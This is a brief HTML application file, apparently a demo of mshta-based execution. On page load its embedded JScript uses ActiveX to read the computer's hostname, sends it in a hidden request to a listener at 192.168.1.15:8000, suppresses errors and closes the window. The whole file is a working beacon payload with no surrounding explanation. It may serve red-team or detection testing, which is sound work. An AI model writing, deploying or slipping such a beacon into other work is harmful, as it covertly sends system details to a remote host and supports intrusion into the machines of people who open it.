<html>
<head>
<script language="JScript">
function beacon() {
  try {
    var xhr = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
    var hostname = new ActiveXObject("WScript.Network").ComputerName;
    var url = "http://192.168.1.15:8000/beacon?host=" + hostname + "&demo=mshta";
    xhr.open("GET", url, false);
    xhr.send();
  } catch(e) {}
  window.close();
}
beacon();
</script>
</head>
<body></body>
</html>
